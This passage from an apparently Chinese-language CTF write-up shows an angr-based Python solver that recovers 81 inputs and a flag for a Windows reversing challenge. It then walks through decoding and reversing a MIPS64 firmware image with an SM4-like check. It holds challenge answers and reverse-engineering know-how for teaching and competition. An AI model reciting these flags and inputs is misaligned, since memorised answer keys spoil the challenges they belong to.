        v11 += 1
        v14 = (v14 + v12) & MASK64
        v8 = (v8 - 0x40A7B892E31B1A47) & MASK64
        i += 1
    return v9

def helper_12940(a1, a2: int, cfg: int):
    v4 = IMG.u8(cfg + 163)
    v29 = cfg_qword(cfg, 8)
    v28 = cfg_qword(cfg, 7)
    v5 = (0xA24BAED4963EE407 - 0x5DB4512B69C11BF9 * a2) & MASK64
    base_step = v5
    v6 = IMG.u8(cfg + 162)
    v23 = v6 + 1
    v26 = cfg_qword(cfg, 9)
    v25 = cfg_qword(cfg, 0)
    v24 = cfg_qword(cfg, 5)
    rounds = ((v4 + a2) & 1) + 3
    v7 = v6 + a2 + 1
    v8 = a2 + v6
    v10 = v4
    i = 0
    while i != rounds:
        v12 = -63 * (v6 // 0x3F)
        v13 = xor64(
            xor64(
                xor64(cfg_qword(cfg, ((i + v4) & 3) + 11), cfg_qword(cfg, i + 1)),
                v28,
            ),
            v5 ^ v29,
        )
        v14 = v7 - 63 * (v8 // 0x3F)
        v15 = rol64_any(v26, i + v4 + 1 - 63 * (v10 // 0x3F))
        v16 = xor64(v25 + v13, rol64_any(v24, i + v23 + v12))
        tmp = v16 + rol64_any(xor64(xor64(v15, a1), v13), v14)
        a1 = bv64(tmp) if is_bv(tmp) else (tmp & MASK64)
        v6 += 1
        v7 += 3
        v8 += 3
        v5 = (base_step + v5) & MASK64
        v10 += 1
        i += 1
    return xor64(a1, cfg_qword(cfg, 10) ^ ((0x94D049BB133111EB - 0x6B2FB644ECCEEE15 * a2) & MASK64))

def helper_12B90(a1: int, a2: int, a3: int, a4: int, cfg: int) -> int:
    v5 = (IMG.u64(cfg + 72) ^ a2 ^ a1 ^ ((0xD6E8FEB86659FD93 * a4 - 0x2917014799A6026D) & MASK64)) & MASK64
    return v5 ^ rol64(a3, ((a4 + IMG.u8(cfg + 163)) % 0x1F) + 1)

def helper_12C00(flag: bytearray, a2: int, a3: int) -> None:
    v6 = 8 * a3
    v7 = 7 * a3
    v8 = 0
    v9 = a3
    while v8 != 40:
        mix = ((a2 >> (v6 & 0x38)) ^ v7 ^ (a2 >> ((v6 & 0x38) ^ 0x38))) & 0xFF
        v10 = (mix + a3 + v8) & 0xFF
        v10 = ((flag[v8] ^ v10) - ((mix ^ v9) & 0xFF)) & 0xFF
        flag[v8] = ror8(v10, ((mix ^ (a3 ^ v8)) & 7))
        v8 += 1
        v9 += 5
        v7 += 13
        v6 += 8

def helper_12CA0(a1: int, a2: int, a3: int, a4: int, a5: int, cfg: int, a7: int) -> int:
    return (
        ((0x9E3779B97F4A7C15 * a7) & MASK64)
        ^ a3
        ^ ((0x2545F4914F6CDD1D * a4 + 0x2545F4914F6CDD1D) & MASK64)
        ^ rol64(IMG.u64(cfg + 56) + a2 + a1, ((a5 + IMG.u8(cfg + 163)) % 0x2F) + 1)
    ) & MASK64

def helper_12E30(a1: int, a2: int, a3: int, a4: int, a5: int, a6: int) -> int:
    v10 = (a3 + a1) & MASK32
    v11 = rol32(a1 ^ a2, a4)
    v12 = (~(v10 | v11)) & MASK32
    if a5 & 1:
        result = (v12 + (a2 ^ ror32(a1, ((a4 + a6 + 7) % 0x1F) + 1))) & MASK32
        if a5 & 2:
            return ((~((a2 ^ a3) | a1)) ^ result) & MASK32
        return result
    result = (v12 ^ rol32(a1 ^ a3, ((a4 + a6 + 11) % 0x1F) + 1)) & MASK32
    if a5 & 2:
        return ((~((a2 ^ a3) | a1)) ^ result) & MASK32
    return result

def helper_12780_concrete(a1: int, a2: int, a3: int, a4: int, cfg: int) -> int:
    v9 = IMG.u8(cfg + 163)
    tmp = a4 + v9
    rot = (tmp % 29) + 1
    v11 = IMG.u64(cfg + 80) ^ ((0x2545F4914F6CDD1D * a4 + 0x2545F4914F6CDD1D) & MASK64)
    seed = rol64(a2, rot) ^ a3 ^ v11
    size = IMG.u64(cfg + 184)
    count = size // 5
    if size > 0x1E4:
        return 0
    ptr = IMG.u64(cfg + 176) + 32
    entries = []
    state = seed
    for _ in range(count):
        state, r0 = splitmix64_step_concrete(state)
        state, r1 = splitmix64_step_concrete(state)
        state, r2 = splitmix64_step_concrete(state)
        state, r3 = splitmix64_step_concrete(state)
        state, r4 = splitmix64_step_concrete(state)
        b0 = (IMG.u32(ptr - 32) ^ r0) & 0xFF
        b1 = (IMG.u32(ptr - 24) ^ r1) & 7
        b2 = (IMG.u32(ptr - 16) ^ r2) & 7
        b3 = (IMG.u32(ptr - 8) ^ r3) & 7
        q = IMG.u64(ptr) ^ r4
        entries.append((b0, b1, b2, b3, q & MASK64))
        ptr += 40
    delta = 0x9E3779B97F4A7C15
    high = (a1 >> 32) & MASK32
    low = a1 & MASK32
    v28 = a3 ^ IMG.u64(cfg + 48) ^ a2
    for idx, (b0, b1, b2, b3, q) in enumerate(entries):
        v23 = IMG.u64(cfg + 120 + 8 * ((b3 + idx + b2 + b1) & 3)) ^ delta ^ q
        shift = (((IMG.u8(cfg + 164 + (b0 & 7)) ^ b1 ^ v9 ^ b0) ^ (idx ^ a4 ^ (2 * b2) ^ (4 * b3))) & 0x1F) + 1
        low_new = high ^ helper_12E30(low, (v28 ^ v23) & MASK32, ((v28 ^ v23) >> 32) & MASK32, shift, IMG.u8(cfg + 164 + (b0 & 7)), idx)
        high, low = low, low_new & MASK32
        delta = (delta - 0x61C8864680B583EB) & MASK64
    return ((high & MASK32) << 32) | (low & MASK32)

def inverse_12940(output: int, a2: int, cfg: int) -> int:
    rounds = ((IMG.u8(cfg + 163) + a2) & 1) + 3
    steps = []
    v4 = IMG.u8(cfg + 163)
    v5 = (0xA24BAED4963EE407 - 0x5DB4512B69C11BF9 * a2) & MASK64
    base_step = v5
    v6 = IMG.u8(cfg + 162)
    v23 = v6 + 1
    v7 = v6 + a2 + 1
    v8 = a2 + v6
    v10 = v4
    v29 = cfg_qword(cfg, 8)
    v28 = cfg_qword(cfg, 7)
    v26 = cfg_qword(cfg, 9)
    v25 = cfg_qword(cfg, 0)
    v24 = cfg_qword(cfg, 5)
    for i in range(rounds):
        v12 = -63 * (v6 // 0x3F)
        v13 = (cfg_qword(cfg, ((i + v4) & 3) + 11) ^ cfg_qword(cfg, i + 1) ^ v28 ^ v5 ^ v29) & MASK64
        v14 = v7 - 63 * (v8 // 0x3F)
        v15 = rol64(v26, i + v4 + 1 - 63 * (v10 // 0x3F))
        v16 = ((v25 + v13) ^ rol64(v24, i + v23 + v12)) & MASK64
        steps.append((v13, v14, v15, v16))
        v6 += 1
        v7 += 3
        v8 += 3
        v5 = (base_step + v5) & MASK64
        v10 += 1
    value = output ^ cfg_qword(cfg, 10) ^ ((0x94D049BB133111EB - 0x6B2FB644ECCEEE15 * a2) & MASK64)
    for v13, v14, v15, v16 in reversed(steps):
        value = ror64((value - v16) & MASK64, v14) ^ v15 ^ v13
    return value & MASK64

def inverse_12630(output: int, a2: int, a3: int, cfg: int, a5: int) -> int:
    v19 = IMG.u8(cfg + 163)
    v18 = a3 + a5 + v19 + 1
    v6 = a3 + v19
    v7 = (0x6B2FB644ECCEEE15 * a3) & MASK64
    v8 = 0xBF58476D1CE4E5B9
    rounds = IMG.u8(cfg + 160) + 2
    v11 = a5 + v6
    v12 = (0x94D049BB133111EB - v7) & MASK64
    v14 = v12
    steps = []
    for i in range(rounds):
        q1 = a2 ^ v8 ^ cfg_qword(cfg, (i & 3) + 11)
        q2 = cfg_qword(cfg, ((i + v19) & 3) + 15)
        rot = v18 + i - 63 * (v11 // 0x3F)
        steps.append((q1 & MASK64, q2, v14, rot))
        v11 += 1
        v14 = (v14 + v12) & MASK64
        v8 = (v8 - 0x40A7B892E31B1A47) & MASK64
    value = output
    for v16, q2, v14, rot in reversed(steps):
        value = ror64((value - v16) & MASK64, rot) ^ q2 ^ v14
    return (
        value
        ^ a2
        ^ IMG.u64(cfg + 40)
        ^ ((0xA24BAED4963EE407 * a5) & MASK64)
        ^ ((0x9E3779B97F4A7C15 - 0x61C8864680B583EB * a3) & MASK64)
    ) & MASK64

def inverse_12480(output: int, a2: int, a3: int, cfg: int, a5: int) -> int:
    v6 = 0xA24BAED4963EE407
    v8 = IMG.u8(cfg + 162)
    v20 = v8 + a3 + 7
    v9 = v8 + a3 + 6
    v10 = v8 + a3
    v19 = a3 + v8 + 1
    v23 = (
        cfg_qword(cfg, 0)
        ^ ((0xD6E8FEB86659FD93 * a5) & MASK64)
        ^ a2
        ^ ((0x9E3779B97F4A7C15 - 0x61C8864680B583EB * a3) & MASK64)
    ) & MASK64
    rounds = IMG.u8(cfg + 161) + 6
    steps = []
    for i in range(rounds):
        v14 = 31 * (v10 // 0x1F)
        v15 = v20 - 31 * ((v9 - v14) // 0x1F) - v14
        v16 = cfg_qword(cfg, (i & 3) + 1) ^ v6 ^ v23
        s1 = i + v19 - v14
        s2 = i + v15
        steps.append((v16, s1, s2))
        v6 = (v6 - 0x5DB4512B69C11BF9) & MASK64
        v9 += 1
        v10 += 1
    high = (output >> 32) & MASK32
    low = output & MASK32
    for v16, s1, s2 in reversed(steps):
        prev_low = high
        term1 = rol32(lo32(v16) ^ prev_low, s1)
        term2 = (term1 + (prev_low ^ hi32(v16))) & MASK32
        term3 = (lo32(v16) + ror32(prev_low, s2)) & MASK32
        prev_high = low ^ term3 ^ term2
        high, low = prev_high & MASK32, prev_low & MASK32
    return (IMG.u64(cfg + 40) ^ (((high & MASK32) << 32) | (low & MASK32))) & MASK64

def hash650(value: int) -> bool:
    v8 = (value ^ 0xA0761D6478BD642F) & MASK64
    rounds = (value & 0x3FF) | 0x800
    rot = value & 0x1F
    v6 = 0
    while rounds:
        v8 ^= rol64((v8 + (value ^ v6)) & MASK64, (rot & 0x3F) + 1)
        v6 = (v6 - 0x61C8864680B583EB) & MASK64
        rot += 1
        rounds -= 1
    return v8 == 0

def sub_140001710_py(state: State, value: int) -> None:
    ctr = ((value & 3) + state.ctr + 1) & 0xFFFFFFFF
    state.ctr = ctr
    state.s2 = rol64(
        state.s2 ^ value ^ 0xD6E8FEB86659FD93,
        ((state.round_idx + ctr) % 0x3F) + 1,
    )

def sub_140001100_py(state: State, a2: int, a3: int, a4: int, a5: int) -> int:
    v11 = state.s2
    v12 = (
        a4
        ^ ((0x2545F4914F6CDD1D * a2 + 0x2545F4914F6CDD1D) & MASK64)
        ^ ((0xA24BAED4963EE407 - 0x5DB4512B69C11BF9 * a3) & MASK64)
    ) & MASK64
    v13 = (v12 ^ v11 ^ a5) & MASK64
    v14 = (a2 + a3) & MASK64
    if ((((v13 & 0xFF) ^ (((a5 & MASK32) >> 1) & 0xFF)) & 7) != 0):
        state.s2 = rol64(a5 ^ v12, (v14 % 0x3F) + 1)
        return 0
    if not hash650(v13 ^ state.s0):
        state.s2 = rol64(
            state.s2 ^ v13 ^ 0x9DDFEA08EB382D69,
            (((state.ctr & 0x1F) + v14) % 0x3F) + 1,
        )
        return 0
    sub_140001710_py(state, a4 ^ v13)
    return 0

class SolveHook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5, a6):  # type: ignore[override]
        return claripy.BVV(0, self.state.arch.bits)

class SolveRolHook(angr.SimProcedure):
    def run(self, a1, a2):  # type: ignore[override]
        return rol64_any(a1, self.state.solver.eval(a2))

class Solve12480Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        return helper_12480(a1, self.state.solver.eval(a2), self.state.solver.eval(a3), self.state.solver.eval(a4), self.state.solver.eval(a5))

class Solve12630Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        return helper_12630(a1, self.state.solver.eval(a2), self.state.solver.eval(a3), self.state.solver.eval(a4), self.state.solver.eval(a5))

class Solve12940Hook(angr.SimProcedure):
    def run(self, a1, a2, a3):  # type: ignore[override]
        return helper_12940(a1, self.state.solver.eval(a2), self.state.solver.eval(a3))

class StubZeroHook(angr.SimProcedure):
    def run(self, *args):  # type: ignore[override]
        return claripy.BVV(0, self.state.arch.bits)

class ConcreteHook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5, a6):  # type: ignore[override]
        st_addr = self.state.solver.eval(a1)
        blob = self.state.memory.load(st_addr, 68)
        raw = self.state.solver.eval(blob, cast_to=bytes)
        st = State.unpack_from(raw)
        sub_140001100_py(
            st,
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
        )
        self.state.memory.store(st_addr, st.pack())
        return claripy.BVV(0, self.state.arch.bits)

class ConcreteRolHook(angr.SimProcedure):
    def run(self, a1, a2):  # type: ignore[override]
        return claripy.BVV(rol64(self.state.solver.eval(a1), self.state.solver.eval(a2)), 64)

class Concrete12480Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        out = helper_12480(
            self.state.solver.eval(a1),
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
        )
        return claripy.BVV(out, 64)

class Concrete12630Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        out = helper_12630(
            self.state.solver.eval(a1),
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
        )
        return claripy.BVV(self.state.solver.eval(out), 64) if is_bv(out) else claripy.BVV(out, 64)

class Concrete12940Hook(angr.SimProcedure):
    def run(self, a1, a2, a3):  # type: ignore[override]
        out = helper_12940(self.state.solver.eval(a1), self.state.solver.eval(a2), self.state.solver.eval(a3))
        return claripy.BVV(self.state.solver.eval(out), 64) if is_bv(out) else claripy.BVV(out, 64)

class Concrete12780Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        out = helper_12780_concrete(
            self.state.solver.eval(a1),
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
        )
        return claripy.BVV(out, 64)

class Concrete12B90Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5):  # type: ignore[override]
        out = helper_12B90(
            self.state.solver.eval(a1),
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
        )
        return claripy.BVV(out, 64)

class Concrete12C00Hook(angr.SimProcedure):
    def run(self, a1, a2, a3):  # type: ignore[override]
        ptr = self.state.solver.eval(a1)
        size = 40
        buf = bytearray(self.state.solver.eval(self.state.memory.load(ptr, size), cast_to=bytes))
        helper_12C00(buf, self.state.solver.eval(a2), self.state.solver.eval(a3))
        self.state.memory.store(ptr, bytes(buf))
        return claripy.BVV(buf[-1], 64)

class Concrete12CA0Hook(angr.SimProcedure):
    def run(self, a1, a2, a3, a4, a5, a6, a7):  # type: ignore[override]
        out = helper_12CA0(
            self.state.solver.eval(a1),
            self.state.solver.eval(a2),
            self.state.solver.eval(a3),
            self.state.solver.eval(a4),
            self.state.solver.eval(a5),
            self.state.solver.eval(a6),
            self.state.solver.eval(a7),
        )
        return claripy.BVV(out, 64)

def make_call_state(func_addr: int, st: State, arg2, solve_mode: bool):
    state = PROJ.factory.call_state(
        func_addr,
        STATE_ADDR,
        arg2,
        ret_addr=SENTINEL,
        cc=CC,
    )
    state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    state.options.add(angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS)
    state.memory.store(STATE_ADDR, st.pack())
    for addr in (
        0x140001100,
        0x140001700,
        0x140012480,
        0x140012630,
        0x140012780,
        0x140012940,
        0x140012B90,
        0x140012C00,
        0x140012CA0,
    ):
        if PROJ.is_hooked(addr):
            PROJ.unhook(addr)
    if solve_mode:
        PROJ.hook(0x140001100, SolveHook(), replace=True)
        PROJ.hook(0x140001700, SolveRolHook(), replace=True)
        PROJ.hook(0x140012480, Solve12480Hook(), replace=True)
        PROJ.hook(0x140012630, Solve12630Hook(), replace=True)
        PROJ.hook(0x140012940, Solve12940Hook(), replace=True)
        PROJ.hook(0x140012780, StubZeroHook(), replace=True)
        PROJ.hook(0x140012B90, StubZeroHook(), replace=True)
        PROJ.hook(0x140012C00, StubZeroHook(), replace=True)
        PROJ.hook(0x140012CA0, StubZeroHook(), replace=True)
    else:
        PROJ.hook(0x140001100, ConcreteHook(), replace=True)
    return state

def solve_round(round_no: int, st: State) -> int:
    func_idx = layer_seq()[round_no]
    _addr, cfg, const = ROUND_META[func_idx]
    v8 = inverse_12940(const, round_no, cfg)
    v7 = inverse_12630(v8, st.s0, round_no, cfg, func_idx)
    value = inverse_12480(v7, st.s0, round_no, cfg, func_idx)
    if not (10**15 <= value < 10**16):
        raise RuntimeError(f"round {round_no} inverse produced invalid input {value}")
    # Cheap sanity check before using the value.
    if helper_12940(helper_12630(helper_12480(value, st.s0, round_no, cfg, func_idx), st.s0, round_no, cfg, func_idx), round_no, cfg) != const:
        raise RuntimeError(f"round {round_no} inverse sanity check failed")
    return value

def execute_round(round_no: int, st: State, value: int) -> State:
    func_idx = layer_seq()[round_no]
    func_addr = ROUND_FUNCS[func_idx]
    state = make_call_state(func_addr, st, claripy.BVV(value, 64), solve_mode=False)
    simgr = PROJ.factory.simgr(state)
    simgr.explore(find=SENTINEL, num_find=1)
    done = simgr.found[0] if simgr.found else None
    if done is None:
        for stash in ("active", "deadended", "errored", "unconstrained"):
            bucket = getattr(simgr, stash, [])
            for item in bucket:
                s = item.state if stash == "errored" else item
                if s.addr == SENTINEL:
                    done = s
                    break
            if done is not None:
                break
    if done is None:
        raise RuntimeError(f"no return state for round {round_no}")
    raw = done.solver.eval(done.memory.load(STATE_ADDR, 68), cast_to=bytes)
    out = State.unpack_from(raw)
    if done.solver.eval(done.regs.rax) != 1:
        raise RuntimeError(f"round {round_no} execution failed")
    return out

def test_first_round() -> None:
    st = init_state()
    st.round_idx = 0
    print("solving round 0...", flush=True)
    value = solve_round(0, st)
    print(f"round0={value}", flush=True)
    print("executing round 0...", flush=True)
    nxt = execute_round(0, st, value)
    print(f"after round0 s0={nxt.s0:#x} s2={nxt.s2:#x} ctr={nxt.ctr}")

def solve_all() -> tuple[list[int], State]:
    st = init_state()
    answers: list[int] = []
    total = len(layer_seq())
    for round_no in range(total):
        st.round_idx = round_no
        value = solve_round(round_no, st)
        answers.append(value)
        st = execute_round(round_no, st, value)
        print(
            f"[{round_no + 1:02d}/{total}] func={layer_seq()[round_no]:02d} "
            f"input={value} s0={st.s0:#x} ctr={st.ctr}",
            flush=True,
        )
    return answers, st

def main() -> None:
    answers, st = solve_all()
    joined = ",".join(str(x) for x in answers)
    print("inputs:", joined)
    print("ctr:", st.ctr)
    print("flag-bytes:", bytes(st.flag))
    try:
        print("flag-text:", bytes(st.flag).decode("ascii"))
    except UnicodeDecodeError:
        print("flag-text: <non-ascii>")

if __name__ == "__main__":
    main()
```

脚本最终得到 81 个输入：

```Plain
4222955693485467,1234927393473493,4422974365508524,2374460989687803,2415623483801167,3532080200047562,1974677284154691,7023557494302925,2601814357518818,2275193726018526,6767356202459882,4391274110683593,1148482718263253,9490995722364172,7907851253944307,3453980261661379,3462258132780584,7462848910097401,9928967712591232,5375177966637832,5271075094231337,7271355496412815,7554622327867487,2201994484186821,1286873340850721,7346799057225551,1394499131837067,8722522144588326,2184163055508504,8305678512079347,6950110895293599,2739607149256909,2110526275669347,9682068183471544,1647369342340197,7617345099784910,9253692454610965,1883086786853128,9721693341542749,2884723970704948,6952967289305862,5025265840471871,1688669310723017,8620482526335265,4316171370047492,2974403130254940,5687236819259064,4457424739815115,1967414836235330,6736276017424103,6075584196405443,6470850315127897,9299278210318665,2560393523932165,5636454344120627,7078245529601868,7604930586145960,1677842513001348,7848126784857122,3428769566050265,9965084167531202,6689170736572774,3273771174980299,6570411072688890,4990710176721311,6623405251508689,7491235105210653,8027384716058645,8393496566149398,5035349212840473,2116319108708051,4619702108282507,7289716283182308,6907373144330701,9028488650282481,3126055355543185,2191530987381423,8376131036024867,6804723537565108,8394669374918305,2241980379966449
```

直接把这一串作为参数喂给程序：

```PowerShell
.\Journey_to_the_West.exe "<上面这串 81 个数字，用逗号连接>"
```

程序输出为：

```Plain
all inputs collected, starting verification...
flag: SUCTF{y0u_h4v3_0v3rc0m3_81_d1ff1cu1t135}
correct
```

## SU_old_bin

先看文件基本信息。

`old.bin` 不是直接可执行文件，也不是常见压缩包头。最开始对样本做字节观察时，可以发现整体分布不太像随机密文，而且对首部做简单异或测试后，很快能发现它是被统一异或了一层。

实际处理方式是:

```
decoded = bytes(b ^ 0x7f for b in old_bin)
```

解完后文件头变成 `IMG0`，说明 `old.bin` 本质上是一个被整体 `xor 0x7f` 过的固件镜像。

解包固件

对 `decoded.bin` 扫描压缩流后，可以提取出 3 段 XZ 数据:

```
0x2028
0x50ed4
0x51aa4
```

其中:

`0x50ed4` 和 `0x51aa4` 解出来都是一些 `SMALLFW` 风格的打包数据

里面继续嵌了 zip / note / 样例文本

基本都是干扰项

真正关键的是 `0x2028` 这段 XZ，解压后得到 `xz_2028.bin`。

从 `xz_2028.bin` 恢复 ELF

`xz_2028.bin` 已经非常像 ELF，只是魔数被破坏了。

把前 4 个字节修成:

```HTTP
7f 45 4c 46
```

即可得到一个可被工具识别的 MIPS64 ELF:

```HTTP
ELF 64-bit LSB executable, MIPS, MIPS64 rel2, statically linked, stripped
```

这里得到的文件就是 `firmware.elf`。

需要注意:

程序头是基本正常的

节头明显损坏

大部分符号信息不可用

直接 `qemu-mips64el-static` 跑会在入口处崩掉

原因不是 ELF 头没修好，而是样本的数据段/GOT 仍然是伪装态，不能直接作为正常静态程序启动。

所以这题正确方向不是“直接动态跑起来”，而是静态分析核心校验逻辑。

总体结构分析

通过反汇编可以定位到几个关键函数:

`0x120007230`: 64 位旋转辅助

`0x120007270`: `splitmix64`

`0x120007344`: PRNG 初始状态生成

`0x1200074a0`: `xoshiro256**`

`0x120007740`: 固定四个 64 位种子常量

`0x120007d30`: 长度 0x40 的洗牌

`0x120007e28`: 6 轮逐字节变换

`0x120008658`: 核心校验函数

`0x120009098` / `0x1200092e8` / `0x120009714`: 轮函数组件

`0x120009428`: key schedule

`0x120009938`: 分组变换主体

`0x120009b7c`: 网络收发 + 调用校验

其中 `0x120009b7c` 的逻辑很清楚:

初始化上下文

读入最多 64 字节输入

调用 `0x120008658` 校验

成功时输出 `VALIDATION_SUCCESS`

失败时输出 `VALIDATION_FAILURE`

成功/失败字符串在只读数据区中是明文可见的:

`0x7eb70`: `VALIDATION_SUCCESS`

`0x7eb88`: `VALIDATION_FAILURE`

上下文初始化

校验前会构造一个上下文，里面最重要的是 3 个缓冲区:

`buf20`: 0x40 字节

`buf28`: 0x40 字节

`buf30`: 0x30 字节

这三个缓冲区由固定种子驱动的 `splitmix64 + xoshiro256**` 生成，因此整个校验其实是完全可复现的。

5.1 固定种子

在 `0x120007740` 和 `0x120007344` 中可以恢复出初始化常量:

c0 = 0xFFF55731369D7563

c1 = 0x16E58EB22FBD5C72

c2 = 0x3632ED844C43F5B0

c3 = 0x390980A442221584

acc = 0x1234567890ABCDEF

5.2 `buf20`

生成逻辑是:

```
buf28[i] = i
```

调用一次 `xoshiro256**`

取随机数低 8 位与右移 11 位后的低 8 位异或

再与 `(i - 0x5b)` 异或

写入 `buf20[i]`

5.3 `buf28`

`buf28` 初始化为 `0..63`，然后调用 `0x120007d30` 做 Fisher-Yates 风格洗牌。

5.4 `buf30`

`buf30` 的每个字节也来自 PRNG，但中间还混入:

```
(i * 7 + 0x3d)
buf20[i & 0x3f]
```

AES S-box

再取一次 PRNG 低字节异或

最后做一次按 `((i % 7) + 1)` 的 64 位左旋后取低字节

这一处在手工翻译时很容易写错，我一开始误写成了右旋，后面校验不通，回看汇编后修正成左旋。

核心校验函数 `0x120008658`

这个函数可以拆成 4 层。

6.1 第一层: 输入补齐并混合 `buf20`

把输入扩展成 64 字节:

前 `len` 个字节是真实输入

剩余位置用 `(i * 17) & 0xff` 填充

然后每个字节再做:

out[i] = input_or_pad[i] ^ ((buf20[(i * 7) & 0x3f] + i) & 0xff)

所以真实输入长度如果不足 64，尾部并不是零填充，而是固定模式填充。

6.2 第二层: `0x7e28` 六轮逐字节变换

这是一个对每个字节独立进行的 6 轮处理。每轮会先从 PRNG 取一个 `rr`，之后对每个位置 `i` 执行:

v ^= (rr + i + rnd) & 0xff

v = rol8(v, 1)

v ^= aes_sbox[(v + rnd * 13) & 0xff]

重要结论:

这层没有跨字节耦合

但它不是双射

所以不能简单写逆函数直接还原

这也是后面求解的关键转折点。

6.3 第三层: `buf28` 置换 + `buf30` + AES S-box + `buf20`

第二层输出记为 `tmp`，之后有:

v = tmp[buf28[i]]

v ^= buf30[i % 0x30]

v = aes_sbox[v]

v ^= buf20[i]

得到新的 64 字节缓冲区。

6.4 第四层: 4 个 16 字节块进入分组变换

这 64 字节被拆成 4 个 block，每个 block 按大端拼成 4 个 32 位字，然后送入 `0x120009938`。

最后的 64 字节输出与程序中固定目标值比较:

目标值位于 `0x7e7c0 ~ 0x7e800`

只要 64 字节完全一致，就返回成功。

分组变换逆向

`0x120009938` 整体结构非常像魔改 SM4。

7.1 关键常量

主密钥是明文放在只读数据区里的:

01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10

对应 4 个 32 位大端字。

另外还存在 FK / CK 风格常量:

FK 在 `0x7e950`

CK 在 `0x7e970`

7.2 轮函数部件

几个关键 helper 可还原为:

f_9098(x, n) = rotl32_window(x, n) ^ 0xDEADBEEF

f_92E8(x)    = x ^ f_9098(x,15) ^ f_9098(x,23) ^ 0xCAFEBABE

f_9714(x)    = x ^ f_9098(x,3) ^ f_9098(x,11) ^ f_9098(x,19) ^ f_9098(x,27) ^ 0x12345678

其中 `rotl32_window` 这里要注意位宽语义:

汇编操作数虽然走的是 64 位寄存器

但逻辑上是“以低 32 位为窗口”的左旋

直接写普通 `rol32` 有时会错，因为原汇编并没有在每一步都强制截成 32 位

7.3 S-box 变换

`0x9104` 不是直接访问 AES S-box，而是:

table[(byte + 0x37) & 0xff]

这张 256 字节表位于 `0x7ea70`。

7.4 Key schedule

这里有一个很容易踩坑的点。

我最开始把所有 round key 都写成:

rk = x0 ^ T'(x1 ^ x2 ^ x3 ^ ck[i])

rk += i

后来回看 `0x120009428` 汇编，发现:

只有第 4 到第 31 轮会做 `+i`

前 4 轮不会再额外加轮号

这个地方一旦写错，分组层整体就对不上，后面的逆推也完全无效。

修正后，`enc_block_9938` 与 `dec_block_9938` 可以严格互逆。

求解思路

完整校验链里，最难的部分不是分组层，而是 `0x7e28`。

8.1 先逆掉后半段

因为:

第三层是可逆的

第四层分组变换也是可逆的

所以可以先从目标 64 字节出发:

逆分组变换

逆第三层置换和 S-box

这样能还原出第二层 `0x7e28` 的输出。

8.2 处理 `0x7e28`

`0x7e28` 不是双射，不能直接整体逆。

但它有个很重要的性质:

每个字节独立处理

一个位置不会依赖其他位置

所以可以对每个位置 `i` 单独枚举 `0..255`，找出哪些输入字节会映射到目标输出字节。

再结合第一层的异或还原，就能得到“这个位置的明文字节候选集合”。

修正完分组层后，候选集合出现了一个非常好的性质:

每一位都有非空候选

候选数很小

大部分位置只有 1~4 个可打印字符

例如前几位候选会变成:

0: A / f

1: 0 \ P l n t

2: a

3: R / g

4: V / {

...

63: }

此时结合题目格式 `flag{...}` 就很自然了:

第 0 位取 `f`

第 1 位取 `l`

第 2 位是 `a`

第 3 位取 `g`

第 4 位取 `{`

剩余位置几乎都能唯一收敛到可打印字母数字。

Exp:

```Python
from __future__ import annotations

from pathlib import Path


 MASK64 = (1 << 64) - 1
 MASK32 = (1 << 32) - 1


def rol64(x: int, n: int) -> int:
     n &= 63
     return ((x << n) | (x >> (64 - n))) & MASK64


def rol32(x: int, n: int) -> int:
     x &= MASK32
     n &= 31
     return ((x << n) | (x >> (32 - n))) & MASK32


def rotr64(x: int, n: int) -> int:
     n &= 63
     return ((x >> n) | (x << (64 - n))) & MASK64


def rot32_window_in_64(x: int, n: int) -> int:
     x &= MASK64
     return ((x << n) | (x >> (32 - n))) & MASK64


class Solver:
     def __init__(self, data: bytes) -> None:
         self.data = data
         self.aes_sbox = data[0x7E6C0:0x7E7C0]
         self.target = data[0x7E7C0:0x7E800]
         self.sm4ish = data[0x7EA70:0x7EB70]
         self.fk = [int.from_bytes(data[0x7E950 + i * 8:0x7E950 + i * 8 + 8], "little") for i in range(4)]
         self.ck = [int.from_bytes(data[0x7E970 + i * 8:0x7E970 + i * 8 + 8], "little") for i in range(32)]

         # 0x9104 uses a table lookup after adding 0x37. The exact pointer value is
         # hidden in the broken GOT, but the code/data layout is consistent with
         # indexing this 256-byte region directly.
         self.t9104 = list(self.sm4ish)

     def f_9104(self, b: int) -> int:
         return self.t9104[(b + 0x37) & 0xFF]

     def f_9184(self, x: int) -> int:
         out = 0
         for shift in (24, 16, 8, 0):
             out = ((out << 8) | self.f_9104((x >> shift) & 0xFF)) & MASK64
         return out

     def f_9098(self, x: int, n: int) -> int:
         return (rot32_window_in_64(x, n) ^ 0xDEADBEEF) & MASK64

     def f_92E8(self, x: int) -> int:
         return (x ^ self.f_9098(x, 15) ^ self.f_9098(x, 23) ^ 0xCAFEBABE) & MASK64

     def f_9714(self, x: int) -> int:
         return (
             x
             ^ self.f_9098(x, 3)
             ^ self.f_9098(x, 11)
             ^ self.f_9098(x, 19)
             ^ self.f_9098(x, 27)
             ^ 0x12345678
         ) & MASK64

     def f_93A0(self, x: int) -> int:
         return self.f_92E8(self.f_9184(x))

     def f_9810(self, x: int) -> int:
         return self.f_9714(self.f_9184(x))

     def f_9898(self, x0: int, x1: int, x2: int, x3: int, rk: int) -> int:
         t = self.f_9810((x1 ^ x2 ^ x3 ^ rk) & MASK64)
